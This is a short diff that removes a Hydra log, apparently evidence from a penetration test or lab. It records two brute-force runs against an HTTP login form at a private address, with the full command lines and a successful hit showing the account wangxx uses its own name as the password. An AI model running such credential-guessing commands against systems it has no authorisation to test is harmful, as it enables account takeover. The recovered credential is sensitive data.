@@ -1,3 +1,0 @@
-# Hydra v9.5 run at 2025-09-10 15:40:06 on 192.168.100.101 http-post-form (hydra -I -V -f -l wangxx -p  -e nsr -t 1 -w 5 -o evidence/html_nsr_sprint.txt 192.168.100.101 http-post-form /login.html:username=^USER^&password=^PASS^:F=Invalid|F=login.html|F=Try again:S=Logout|S=Protected|S=Welcome)
-# Hydra v9.5 run at 2025-09-10 15:40:14 on 192.168.100.101 http-post-form (hydra -I -V -f -l wangxx -p  -e nsr -t 1 -w 5 -o evidence/html_nsr_sprint.txt 192.168.100.101 http-post-form /login.html:username=^USER^&password=^PASS^:Invalid)
-[80][http-post-form] host: 192.168.100.101   login: wangxx   password: wangxx
